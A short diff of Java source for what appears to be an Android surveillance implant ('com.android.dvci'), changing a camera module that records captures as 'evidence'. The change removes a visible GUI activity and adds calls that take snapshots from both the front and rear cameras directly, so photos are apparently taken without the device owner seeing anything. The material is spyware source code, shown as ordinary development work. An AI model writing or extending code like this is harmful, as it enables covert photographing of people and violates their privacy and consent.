@@ -11,7 +11,6 @@ package com.android.dvci.module;
 
 import java.io.IOException;
 
-import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 
@@ -20,7 +19,7 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
-import com.android.dvci.gui.CGui;
+import com.android.dvci.module.camera.CameraSnapshot;
 import com.android.dvci.util.Check;
 import com.android.mm.M;
 
@@ -129,9 +128,11 @@ public class ModuleCamera extends BaseInstantModule {
 		}
 		Status status = Status.self();
 
-		Intent intent = new Intent(Status.getAppContext(), CGui.class);
-		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-		Status.getAppContext().startActivity(intent);
+		if(Build.VERSION.SDK_INT > Build.VERSION_CODES.HONEYCOMB) {
+			CameraSnapshot camera = new CameraSnapshot();
+			camera.snapshot(0);
+			camera.snapshot(1);
+		}
 
 	}
 
